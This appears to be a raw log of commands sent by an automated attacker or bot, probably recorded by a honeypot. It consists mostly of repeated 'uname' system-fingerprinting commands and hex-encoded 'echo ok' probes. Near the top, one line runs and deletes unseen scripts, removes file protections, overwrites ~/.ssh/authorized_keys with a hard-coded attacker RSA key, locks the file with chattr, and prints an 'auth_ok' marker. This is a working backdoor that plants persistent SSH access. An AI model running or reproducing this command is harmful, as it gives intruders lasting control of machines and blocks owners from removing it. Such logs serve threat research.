uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -m
uname -s -m
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
uname -s -m
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -m
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
echo -e "\x6F\x6B"
